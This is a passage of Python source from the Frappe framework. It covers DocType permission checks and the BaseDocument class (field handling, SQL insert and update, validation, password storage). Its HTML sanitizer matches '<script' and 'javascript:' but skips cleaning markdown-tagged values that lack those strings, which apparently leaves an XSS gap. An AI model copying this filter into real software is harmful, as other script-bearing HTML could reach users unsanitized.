cint(d.permlevel) > 0 and d.role != 'All':\n\t\t\thas_zero_perm = False\n\t\t\tfor p in permissions:\n\t\t\t\tif p.role==d.role and (p.permlevel or 0)==0 and p!=d:\n\t\t\t\t\thas_zero_perm = True\n\t\t\t\t\tbreak\n\n\t\t\tif not has_zero_perm:\n\t\t\t\tfrappe.throw(_(\"{0}: Permission at level 0 must be set before higher levels are set\").format(get_txt(d)))\n\n\t\t\tfor invalid in (\"create\", \"submit\", \"cancel\", \"amend\"):\n\t\t\t\tif d.get(invalid): d.set(invalid, 0)\n\n\tdef check_permission_dependency(d):\n\t\tif d.cancel and not d.submit:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set Cancel without Submit\").format(get_txt(d)))\n\n\t\tif (d.submit or d.cancel or d.amend) and not d.write:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set Submit, Cancel, Amend without Write\").format(get_txt(d)))\n\t\tif d.amend and not d.write:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set Amend without Cancel\").format(get_txt(d)))\n\t\tif d.get(\"import\") and not d.create:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set Import without Create\").format(get_txt(d)))\n\n\tdef remove_rights_for_single(d):\n\t\tif not issingle:\n\t\t\treturn\n\n\t\tif d.report:\n\t\t\tfrappe.msgprint(_(\"Report cannot be set for Single types\"))\n\t\t\td.report = 0\n\t\t\td.set(\"import\", 0)\n\t\t\td.set(\"export\", 0)\n\n\t\tfor ptype, label in [[\"set_user_permissions\", _(\"Set User Permissions\")]]:\n\t\t\tif d.get(ptype):\n\t\t\t\td.set(ptype, 0)\n\t\t\t\tfrappe.msgprint(_(\"{0} cannot be set for Single types\").format(label))\n\n\tdef check_if_submittable(d):\n\t\tif d.submit and not issubmittable:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set Assign Submit if not Submittable\").format(get_txt(d)))\n\t\telif d.amend and not issubmittable:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set Assign Amend if not Submittable\").format(get_txt(d)))\n\n\tdef check_if_importable(d):\n\t\tif d.get(\"import\") and not isimportable:\n\t\t\tfrappe.throw(_(\"{0}: Cannot set import as {1} is not importable\").format(get_txt(d), doctype))\n\n\tfor d in permissions:\n\t\tif not d.permlevel:\n\t\t\td.permlevel=0\n\t\tcheck_atleast_one_set(d)\n\t\tif not for_remove:\n\t\t\tcheck_double(d)\n\t\t\tcheck_permission_dependency(d)\n\t\t\tcheck_if_submittable(d)\n\t\t\tcheck_if_importable(d)\n\t\tcheck_level_zero_is_set(d)\n\t\tremove_rights_for_single(d)\n\ndef make_module_and_roles(doc, perm_fieldname=\"permissions\"):\n\t\"\"\"Make `Module Def` and `Role` records if already not made. Called while installing.\"\"\"\n\ttry:\n\t\tif hasattr(doc,'restrict_to_domain') and doc.restrict_to_domain and \\\n\t\t\tnot frappe.db.exists('Domain', doc.restrict_to_domain):\n\t\t\tfrappe.get_doc(dict(doctype='Domain', domain=doc.restrict_to_domain)).insert()\n\n\t\tif not frappe.db.exists(\"Module Def\", doc.module):\n\t\t\tm = frappe.get_doc({\"doctype\": \"Module Def\", \"module_name\": doc.module})\n\t\t\tm.app_name = frappe.local.module_app[frappe.scrub(doc.module)]\n\t\t\tm.flags.ignore_mandatory = m.flags.ignore_permissions = True\n\t\t\tm.insert()\n\n\t\tdefault_roles = [\"Administrator\", \"Guest\", \"All\"]\n\t\troles = [p.role for p in doc.get(\"permissions\") or []] + default_roles\n\n\t\tfor role in list(set(roles)):\n\t\t\tif not frappe.db.exists(\"Role\", role):\n\t\t\t\tr = frappe.get_doc(dict(doctype= \"Role\", role_name=role, desk_access=1))\n\t\t\t\tr.flags.ignore_mandatory = r.flags.ignore_permissions = True\n\t\t\t\tr.insert()\n\texcept frappe.DoesNotExistError as e:\n\t\tpass\n\texcept frappe.SQLError as e:\n\t\tif e.args[0]==1146:\n\t\t\tpass\n\t\telse:\n\t\t\traise\n\ndef init_list(doctype):\n\t\"\"\"Make boilerplate list views.\"\"\"\n\tdoc = frappe.get_meta(doctype)\n\tmake_boilerplate(\"controller_list.js\", doc)\n\tmake_boilerplate(\"controller_list.html\", doc)\n\ndef check_if_fieldname_conflicts_with_methods(doctype, fieldname):\n\tdoc = frappe.get_doc({\"doctype\": doctype})\n\tmethod_list = [method for method in dir(doc) if isinstance(method, str) and callable(getattr(doc, method))]\n\n\tif fieldname in method_list:\n\t\tfrappe.throw(_(\"Fieldname {0} conflicting with meta object\").format(fieldname))\n\ndef clear_linked_doctype_cache():\n\tfrappe.cache().delete_value('linked_doctypes_without_ignore_user_permissions_enabled')\n/n/n/nfrappe/model/base_document.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\nfrom six import iteritems, string_types\nimport datetime\nimport frappe, sys\nfrom frappe import _\nfrom frappe.utils import (cint, flt, now, cstr, strip_html,\n\tsanitize_html, sanitize_email, cast_fieldtype)\nfrom frappe.model import default_fields\nfrom frappe.model.naming import set_new_name\nfrom frappe.model.utils.link_count import notify_link_count\nfrom frappe.modules import load_doctype_module\nfrom frappe.model import display_fieldtypes\nfrom frappe.model.db_schema import type_map, varchar_len\nfrom frappe.utils.password import get_decrypted_password, set_encrypted_password\n\n_classes = {}\n\ndef get_controller(doctype):\n\t\"\"\"Returns the **class** object of the given DocType.\n\tFor `custom` type, returns `frappe.model.document.Document`.\n\n\t:param doctype: DocType name as string.\"\"\"\n\tfrom frappe.model.document import Document\n\tglobal _classes\n\n\tif not doctype in _classes:\n\t\tmodule_name, custom = frappe.db.get_value(\"DocType\", doctype, (\"module\", \"custom\"), cache=True) \\\n\t\t\tor [\"Core\", False]\n\n\t\tif custom:\n\t\t\t_class = Document\n\t\telse:\n\t\t\tmodule = load_doctype_module(doctype, module_name)\n\t\t\tclassname = doctype.replace(\" \", \"\").replace(\"-\", \"\")\n\t\t\tif hasattr(module, classname):\n\t\t\t\t_class = getattr(module, classname)\n\t\t\t\tif issubclass(_class, BaseDocument):\n\t\t\t\t\t_class = getattr(module, classname)\n\t\t\t\telse:\n\t\t\t\t\traise ImportError(doctype)\n\t\t\telse:\n\t\t\t\traise ImportError(doctype)\n\t\t_classes[doctype] = _class\n\n\treturn _classes[doctype]\n\nclass BaseDocument(object):\n\tignore_in_getter = (\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\")\n\n\tdef __init__(self, d):\n\t\tself.update(d)\n\t\tself.dont_update_if_missing = []\n\n\t\tif hasattr(self, \"__setup__\"):\n\t\t\tself.__setup__()\n\n\t@property\n\tdef meta(self):\n\t\tif not hasattr(self, \"_meta\"):\n\t\t\tself._meta = frappe.get_meta(self.doctype)\n\n\t\treturn self._meta\n\n\tdef update(self, d):\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\n\t\t# first set default field values of base document\n\t\tfor key in default_fields:\n\t\t\tif key in d:\n\t\t\t\tself.set(key, d.get(key))\n\n\t\tfor key, value in iteritems(d):\n\t\t\tself.set(key, value)\n\n\t\treturn self\n\n\tdef update_if_missing(self, d):\n\t\tif isinstance(d, BaseDocument):\n\t\t\td = d.get_valid_dict()\n\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\t\tfor key, value in iteritems(d):\n\t\t\t# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value\n\t\t\tif (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):\n\t\t\t\tself.set(key, value)\n\n\tdef get_db_value(self, key):\n\t\treturn frappe.db.get_value(self.doctype, self.name, key)\n\n\tdef get(self, key=None, filters=None, limit=None, default=None):\n\t\tif key:\n\t\t\tif isinstance(key, dict):\n\t\t\t\treturn _filter(self.get_all_children(), key, limit=limit)\n\t\t\tif filters:\n\t\t\t\tif isinstance(filters, dict):\n\t\t\t\t\tvalue = _filter(self.__dict__.get(key, []), filters, limit=limit)\n\t\t\t\telse:\n\t\t\t\t\tdefault = filters\n\t\t\t\t\tfilters = None\n\t\t\t\t\tvalue = self.__dict__.get(key, default)\n\t\t\telse:\n\t\t\t\tvalue = self.__dict__.get(key, default)\n\n\t\t\tif value is None and key not in self.ignore_in_getter \\\n\t\t\t\tand key in (d.fieldname for d in self.meta.get_table_fields()):\n\t\t\t\tself.set(key, [])\n\t\t\t\tvalue = self.__dict__.get(key)\n\n\t\t\treturn value\n\t\telse:\n\t\t\treturn self.__dict__\n\n\tdef getone(self, key, filters=None):\n\t\treturn self.get(key, filters=filters, limit=1)[0]\n\n\tdef set(self, key, value, as_value=False):\n\t\tif isinstance(value, list) and not as_value:\n\t\t\tself.__dict__[key] = []\n\t\t\tself.extend(key, value)\n\t\telse:\n\t\t\tself.__dict__[key] = value\n\n\tdef delete_key(self, key):\n\t\tif key in self.__dict__:\n\t\t\tdel self.__dict__[key]\n\n\tdef append(self, key, value=None):\n\t\tif value==None:\n\t\t\tvalue={}\n\t\tif isinstance(value, (dict, BaseDocument)):\n\t\t\tif not self.__dict__.get(key):\n\t\t\t\tself.__dict__[key] = []\n\t\t\tvalue = self._init_child(value, key)\n\t\t\tself.__dict__[key].append(value)\n\n\t\t\t# reference parent document\n\t\t\tvalue.parent_doc = self\n\n\t\t\treturn value\n\t\telse:\n\n\t\t\t# metaclasses may have arbitrary lists\n\t\t\t# which we can ignore\n\t\t\tif (getattr(self, '_metaclass', None)\n\t\t\t\tor self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):\n\t\t\t\treturn value\n\n\t\t\traise ValueError(\n\t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not {2} ({3})'.format(key,\n\t\t\t\t\tself.name, str(type(value))[1:-1], value)\n\t\t\t)\n\n\tdef extend(self, key, value):\n\t\tif isinstance(value, list):\n\t\t\tfor v in value:\n\t\t\t\tself.append(key, v)\n\t\telse:\n\t\t\traise ValueError\n\n\tdef remove(self, doc):\n\t\tself.get(doc.parentfield).remove(doc)\n\n\tdef _init_child(self, value, key):\n\t\tif not self.doctype:\n\t\t\treturn value\n\t\tif not isinstance(value, BaseDocument):\n\t\t\tif \"doctype\" not in value:\n\t\t\t\tvalue[\"doctype\"] = self.get_table_field_doctype(key)\n\t\t\t\tif not value[\"doctype\"]:\n\t\t\t\t\traise AttributeError(key)\n\t\t\tvalue = get_controller(value[\"doctype\"])(value)\n\t\t\tvalue.init_valid_columns()\n\n\t\tvalue.parent = self.name\n\t\tvalue.parenttype = self.doctype\n\t\tvalue.parentfield = key\n\n\t\tif value.docstatus is None:\n\t\t\tvalue.docstatus = 0\n\n\t\tif not getattr(value, \"idx\", None):\n\t\t\tvalue.idx = len(self.get(key) or []) + 1\n\n\t\tif not getattr(value, \"name\", None):\n\t\t\tvalue.__dict__['__islocal'] = 1\n\n\t\treturn value\n\n\tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False):\n\t\td = frappe._dict()\n\t\tfor fieldname in self.meta.get_valid_columns():\n\t\t\td[fieldname] = self.get(fieldname)\n\n\t\t\t# if no need for sanitization and value is None, continue\n\t\t\tif not sanitize and d[fieldname] is None:\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tif df:\n\t\t\t\tif df.fieldtype==\"Check\":\n\t\t\t\t\tif d[fieldname]==None:\n\t\t\t\t\t\td[fieldname] = 0\n\n\t\t\t\t\telif (not isinstance(d[fieldname], int) or d[fieldname] > 1):\n\t\t\t\t\t\td[fieldname] = 1 if cint(d[fieldname]) else 0\n\n\t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int):\n\t\t\t\t\td[fieldname] = cint(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float):\n\t\t\t\t\td[fieldname] = flt(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\":\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\":\n\t\t\t\t\t# unique empty field should be set to None\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype != 'Table':\n\t\t\t\t\tfrappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))\n\n\t\t\t\tif convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):\n\t\t\t\t\td[fieldname] = str(d[fieldname])\n\n\t\treturn d\n\n\tdef init_valid_columns(self):\n\t\tfor key in default_fields:\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\t\t\tif key in (\"idx\", \"docstatus\") and self.__dict__[key] is None:\n\t\t\t\tself.__dict__[key] = 0\n\n\t\tfor key in self.get_valid_columns():\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\tdef get_valid_columns(self):\n\t\tif self.doctype not in frappe.local.valid_columns:\n\t\t\tif self.doctype in (\"DocField\", \"DocPerm\") and self.parent in (\"DocType\", \"DocField\", \"DocPerm\"):\n\t\t\t\tfrom frappe.model.meta import get_table_columns\n\t\t\t\tvalid = get_table_columns(self.doctype)\n\t\t\telse:\n\t\t\t\tvalid = self.meta.get_valid_columns()\n\n\t\t\tfrappe.local.valid_columns[self.doctype] = valid\n\n\t\treturn frappe.local.valid_columns[self.doctype]\n\n\tdef is_new(self):\n\t\treturn self.get(\"__islocal\")\n\n\tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):\n\t\tdoc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)\n\t\tdoc[\"doctype\"] = self.doctype\n\t\tfor df in self.meta.get_table_fields():\n\t\t\tchildren = self.get(df.fieldname) or []\n\t\t\tdoc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]\n\n\t\tif no_nulls:\n\t\t\tfor k in list(doc):\n\t\t\t\tif doc[k] is None:\n\t\t\t\t\tdel doc[k]\n\n\t\tif no_default_fields:\n\t\t\tfor k in list(doc):\n\t\t\t\tif k in default_fields:\n\t\t\t\t\tdel doc[k]\n\n\t\tfor key in (\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"):\n\t\t\tif self.get(key):\n\t\t\t\tdoc[key] = self.get(key)\n\n\t\treturn doc\n\n\tdef as_json(self):\n\t\treturn frappe.as_json(self.as_dict())\n\n\tdef get_table_field_doctype(self, fieldname):\n\t\treturn self.meta.get_field(fieldname).options\n\n\tdef get_parentfield_of_doctype(self, doctype):\n\t\tfieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]\n\t\treturn fieldname[0] if fieldname else None\n\n\tdef db_insert(self):\n\t\t\"\"\"INSERT the document (with valid columns) in the database.\"\"\"\n\t\tif not self.name:\n\t\t\t# name will be set by document class in most cases\n\t\t\tset_new_name(self)\n\n\t\tif not self.creation:\n\t\t\tself.creation = self.modified = now()\n\t\t\tself.created_by = self.modifield_by = frappe.session.user\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\tcolumns = list(d)\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}`\n\t\t\t\t({columns}) values ({values})\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tcolumns = \", \".join([\"`\"+c+\"`\" for c in columns]),\n\t\t\t\t\tvalues = \", \".join([\"%s\"] * len(columns))\n\t\t\t\t), list(d.values()))\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062:\n\t\t\t\tif \"PRIMARY\" in cstr(e.args[1]):\n\t\t\t\t\tif self.meta.autoname==\"hash\":\n\t\t\t\t\t\t# hash collision? try again\n\t\t\t\t\t\tself.name = None\n\t\t\t\t\t\tself.db_insert()\n\t\t\t\t\t\treturn\n\n\t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e)\n\n\t\t\t\telif \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\t\t# unique constraint\n\t\t\t\t\tself.show_unique_validation_message(e)\n\t\t\t\telse:\n\t\t\t\t\traise\n\t\t\telse:\n\t\t\t\traise\n\t\tself.set(\"__islocal\", False)\n\n\tdef db_update(self):\n\t\tif self.get(\"__islocal\") or not self.name:\n\t\t\tself.db_insert()\n\t\t\treturn\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\t# don't update name, as case might've been changed\n\t\tname = d['name']\n\t\tdel d['name']\n\n\t\tcolumns = list(d)\n\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}`\n\t\t\t\tset {values} where name=%s\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tvalues = \", \".join([\"`\"+c+\"`=%s\" for c in columns])\n\t\t\t\t), list(d.values()) + [name])\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\tself.show_unique_validation_message(e)\n\t\t\telse:\n\t\t\t\traise\n\n\tdef show_unique_validation_message(self, e):\n\t\ttype, value, traceback = sys.exc_info()\n\t\tfieldname, label = str(e).split(\"'\")[-2], None\n\n\t\t# unique_first_fieldname_second_fieldname is the constraint name\n\t\t# created using frappe.db.add_unique\n\t\tif \"unique_\" in fieldname:\n\t\t\tfieldname = fieldname.split(\"_\", 1)[1]\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif df:\n\t\t\tlabel = df.label\n\n\t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname)))\n\n\t\t# this is used to preserve traceback\n\t\traise frappe.UniqueValidationError(self.doctype, self.name, e)\n\n\tdef update_modified(self):\n\t\t'''Update modified timestamp'''\n\t\tself.set(\"modified\", now())\n\t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)\n\n\tdef _fix_numeric_types(self):\n\t\tfor df in self.meta.get(\"fields\"):\n\t\t\tif df.fieldtype == \"Check\":\n\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\telif self.get(df.fieldname) is not None:\n\t\t\t\tif df.fieldtype == \"Int\":\n\t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\t\telif df.fieldtype in (\"Float\", \"Currency\", \"Percent\"):\n\t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname)))\n\n\t\tif self.docstatus is not None:\n\t\t\tself.docstatus = cint(self.docstatus)\n\n\tdef _get_missing_mandatory_fields(self):\n\t\t\"\"\"Get mandatory fields that do not have any values\"\"\"\n\t\tdef get_msg(df):\n\t\t\tif df.fieldtype == \"Table\":\n\t\t\t\treturn \"{}: {}: {}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label))\n\n\t\t\telif self.parentfield:\n\t\t\t\treturn \"{}: {} {} #{}: {}: {}\".format(_(\"Error\"), frappe.bold(_(self.doctype)),\n\t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label))\n\n\t\t\telse:\n\t\t\t\treturn _(\"Error: Value missing for {0}: {1}\").format(_(df.parent), _(df.label))\n\n\t\tmissing = []\n\n\t\tfor df in self.meta.get(\"fields\", {\"reqd\": ('=', 1)}):\n\t\t\tif self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():\n\t\t\t\tmissing.append((df.fieldname, get_msg(df)))\n\n\t\t# check for missing parent and parenttype\n\t\tif self.meta.istable:\n\t\t\tfor fieldname in (\"parent\", \"parenttype\"):\n\t\t\t\tif not self.get(fieldname):\n\t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname))))\n\n\t\treturn missing\n\n\tdef get_invalid_links(self, is_submittable=False):\n\t\t'''Returns list of invalid links and also updates fetch values if not set'''\n\t\tdef get_msg(df, docname):\n\t\t\tif self.parentfield:\n\t\t\t\treturn \"{} #{}: {}: {}\".format(_(\"Row\"), self.idx, _(df.label), docname)\n\t\t\telse:\n\t\t\t\treturn \"{}: {}\".format(_(df.label), docname)\n\n\t\tinvalid_links = []\n\t\tcancelled_links = []\n\n\t\tfor df in (self.meta.get_link_fields()\n\t\t\t\t+ self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Dynamic Link\")})):\n\t\t\tdocname = self.get(df.fieldname)\n\n\t\t\tif docname:\n\t\t\t\tif df.fieldtype==\"Link\":\n\t\t\t\t\tdoctype = df.options\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field {0}\").format(df.fieldname))\n\t\t\t\telse:\n\t\t\t\t\tdoctype = self.get(df.options)\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options)))\n\n\t\t\t\t# MySQL is case insensitive. Preserve case of the original docname in the Link Field.\n\n\t\t\t\t# get a map of values ot fetch along with this link query\n\t\t\t\t# that are mapped as link_fieldname.source_fieldname in Options of\n\t\t\t\t# Readonly or Data or Text type fields\n\n\t\t\t\tfields_to_fetch = [\n\t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname)\n\t\t\t\t\tif\n\t\t\t\t\t\tnot _df.get('fetch_if_empty')\n\t\t\t\t\t\tor (_df.get('fetch_if_empty') and not self.get(_df.fieldname))\n\t\t\t\t]\n\n\t\t\t\tif not fields_to_fetch:\n\t\t\t\t\t# cache a single value type\n\t\t\t\t\tvalues = frappe._dict(name=frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\t'name', cache=True))\n\t\t\t\telse:\n\t\t\t\t\tvalues_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]\n\t\t\t\t\t\tfor _df in fields_to_fetch]\n\n\t\t\t\t\t# don't cache if fetching other values too\n\t\t\t\t\tvalues = frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\tvalues_to_fetch, as_dict=True)\n\n\t\t\t\tif frappe.get_meta(doctype).issingle:\n\t\t\t\t\tvalues.name = doctype\n\n\t\t\t\tif values:\n\t\t\t\t\tsetattr(self, df.fieldname, values.name)\n\n\t\t\t\t\tfor _df in fields_to_fetch:\n\t\t\t\t\t\tif self.is_new() or self.docstatus != 1 or _df.allow_on_submit:\n\t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])\n\n\t\t\t\t\tnotify_link_count(doctype, docname)\n\n\t\t\t\t\tif not values.name:\n\t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\t\t\t\telif (df.fieldname != \"amended_from\"\n\t\t\t\t\t\tand (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable\n\t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2):\n\n\t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\treturn invalid_links, cancelled_links\n\n\tdef _validate_selects(self):\n\t\tif frappe.flags.in_import:\n\t\t\treturn\n\n\t\tfor df in self.meta.get_select_fields():\n\t\t\tif df.fieldname==\"naming_series\" or not (self.get(df.fieldname) and df.options):\n\t\t\t\tcontinue\n\n\t\t\toptions = (df.options or \"\").split(\"\\n\")\n\n\t\t\t# if only empty options\n\t\t\tif not filter(None, options):\n\t\t\t\tcontinue\n\n\t\t\t# strip and set\n\t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip())\n\t\t\tvalue = self.get(df.fieldname)\n\n\t\t\tif value not in options and not (frappe.flags.in_test and value.startswith(\"_T-\")):\n\t\t\t\t# show an elaborate message\n\t\t\t\tprefix = _(\"Row #{0}:\").format(self.idx) if self.get(\"parentfield\") else \"\"\n\t\t\t\tlabel = _(self.meta.get_label(df.fieldname))\n\t\t\t\tcomma_options = '\", \"'.join(_(each) for each in options)\n\n\t\t\t\tfrappe.throw(_('{0} {1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label,\n\t\t\t\t\tvalue, comma_options))\n\n\tdef _validate_constants(self):\n\t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:\n\t\t\treturn\n\n\t\tconstants = [d.fieldname for d in self.meta.get(\"fields\", {\"set_only_once\": ('=',1)})]\n\t\tif constants:\n\t\t\tvalues = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)\n\n\t\tfor fieldname in constants:\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\t# This conversion to string only when fieldtype is Date\n\t\t\tif df.fieldtype == 'Date' or df.fieldtype == 'Datetime':\n\t\t\t\tvalue = str(values.get(fieldname))\n\n\t\t\telse:\n\t\t\t\tvalue  = values.get(fieldname)\n\n\t\t\tif self.get(fieldname) != value:\n\t\t\t\tfrappe.throw(_(\"Value cannot be changed for {0}\").format(self.meta.get_label(fieldname)),\n\t\t\t\t\tfrappe.CannotChangeConstantError)\n\n\tdef _validate_length(self):\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tif self.meta.issingle:\n\t\t\t# single doctype value type is mediumtext\n\t\t\treturn\n\n\t\tcolumn_types_to_check_length = ('varchar', 'int', 'bigint')\n\n\t\tfor fieldname, value in iteritems(self.get_valid_dict()):\n\t\t\tdf = self.meta.get_field(fieldname)\n\n\t\t\tif not df or df.fieldtype == 'Check':\n\t\t\t\t# skip standard fields and Check fields\n\t\t\t\tcontinue\n\n\t\t\tcolumn_type = type_map[df.fieldtype][0] or None\n\t\t\tdefault_column_max_length = type_map[df.fieldtype][1] or None\n\n\t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length:\n\t\t\t\tmax_length = cint(df.get(\"length\")) or cint(default_column_max_length)\n\n\t\t\t\tif len(cstr(value)) > max_length:\n\t\t\t\t\tif self.parentfield and self.idx:\n\t\t\t\t\t\treference = _(\"{0}, Row {1}\").format(_(self.doctype), self.idx)\n\n\t\t\t\t\telse:\n\t\t\t\t\t\treference = \"{0} {1}\".format(_(self.doctype), self.name)\n\n\t\t\t\t\tfrappe.throw(_(\"{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}\")\\\n\t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))\n\n\tdef _validate_update_after_submit(self):\n\t\t# get the full doc with children\n\t\tdb_values = frappe.get_doc(self.doctype, self.name).as_dict()\n\n\t\tfor key in self.as_dict():\n\t\t\tdf = self.meta.get_field(key)\n\t\t\tdb_value = db_values.get(key)\n\n\t\t\tif df and not df.allow_on_submit and (self.get(key) or db_value):\n\t\t\t\tif df.fieldtype==\"Table\":\n\t\t\t\t\t# just check if the table size has changed\n\t\t\t\t\t# individual fields will be checked in the loop for children\n\t\t\t\t\tself_value = len(self.get(key))\n\t\t\t\t\tdb_value = len(db_value)\n\n\t\t\t\telse:\n\t\t\t\t\tself_value = self.get_value(key)\n\n\t\t\t\tif self_value != db_value:\n\t\t\t\t\tfrappe.throw(_(\"Not allowed to change {0} after submission\").format(df.label),\n\t\t\t\t\t\tfrappe.UpdateAfterSubmitError)\n\n\tdef _sanitize_content(self):\n\t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS.\n\n\t\t\t- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'\n\t\t\"\"\"\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tfor fieldname, value in self.get_valid_dict().items():\n\t\t\tif not value or not isinstance(value, string_types):\n\t\t\t\tcontinue\n\n\t\t\tvalue = frappe.as_unicode(value)\n\n\t\t\tif (u\"<\" not in value and u\">\" not in value):\n\t\t\t\t# doesn't look like html so no need\n\t\t\t\tcontinue\n\n\t\t\telif \"<!-- markdown -->\" in value and not (\"<script\" in value or \"javascript:\" in value):\n\t\t\t\t# should be handled separately via the markdown converter function\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tsanitized_value = value\n\n\t\t\tif df and df.get(\"fieldtype\") in (\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\":\n\t\t\t\tsanitized_value = sanitize_email(value)\n\n\t\t\telif df and (df.get(\"ignore_xss_filter\")\n\t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")\n\n\t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n\t\t\t\t\t\tor self.docstatus==2\n\t\t\t\t\t\tor (self.docstatus==1 and not df.get(\"allow_on_submit\"))):\n\t\t\t\tcontinue\n\n\t\t\telse:\n\t\t\t\tsanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')\n\n\t\t\tself.set(fieldname, sanitized_value)\n\n\tdef _save_passwords(self):\n\t\t'''Save password field values in __Auth table'''\n\t\tif self.flags.ignore_save_passwords is True:\n\t\t\treturn\n\n\t\tfor df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):\n\t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue\n\t\t\tnew_password = self.get(df.fieldname)\n\t\t\tif new_password and not self.is_dummy_password(new_password):\n\t\t\t\t# is not a dummy password like '*****'\n\t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname)\n\n\t\t\t\t# set dummy password like '*****'\n\t\t\t\tself.set(df.fieldname, '*'*len(new_password))\n\n\tdef get_password(self, fieldname='password', raise_exception=True):\n\t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):\n\t\t\treturn self.get(fieldname)\n\n\t\treturn get_decrypted_password(self.doctype, self.name, fieldname, 